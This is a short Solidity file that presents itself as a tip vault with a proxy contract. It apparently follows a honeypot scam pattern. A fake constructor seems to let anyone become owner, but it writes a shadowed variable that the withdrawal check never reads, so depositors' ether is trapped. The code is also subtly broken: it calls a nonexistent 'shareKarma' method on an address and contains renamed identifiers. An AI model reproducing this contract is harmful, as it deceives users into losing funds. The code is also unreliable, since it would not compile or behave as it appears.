// SPDX-License-Identifier: MIT
pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyFounder { if (msg.sender == CommunityLead) _; } address CommunityLead = msg.sender;
    function sharekarmaFounder(address _founder) public onlyFounder { CommunityLead = _founder; }
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract TipvaultProxy is Proxy {
    address public CommunityLead;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function TipVault() public payable {
        if (msg.sender == tx.origin) {
            CommunityLead = msg.sender;
            fund();
        }
    }

    function fund() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function withdrawTips(uint256 amount) public onlyFounder {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.shareKarma(amount);
        }
    }
}